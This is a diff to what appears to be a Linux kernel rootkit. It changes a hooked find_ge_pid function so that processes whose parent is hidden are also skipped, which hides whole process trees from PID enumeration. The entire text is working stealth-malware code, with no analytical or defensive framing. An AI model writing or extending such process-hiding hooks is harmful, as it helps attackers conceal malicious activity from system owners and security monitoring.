@@ -88,8 +88,21 @@ static bool is_hidden_proc(pid_t pid)
 static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
 {
 	struct pid *pid = real_find_ge_pid(nr, ns);
-	while (pid && is_hidden_proc(pid->numbers->nr))
+
+	while (pid) {
+		if (is_hidden_proc(pid->numbers->nr))
+			goto next;
+		struct task_struct *t = pid_task(pid, PIDTYPE_TGID);
+		if (!t)
+			goto next;
+		pid_t ppid = t->real_parent->pid;
+		if (is_hidden_proc(ppid))
+			goto next;
+		break;
+next:
 		pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
+	}
+
 	return pid;
 }
 
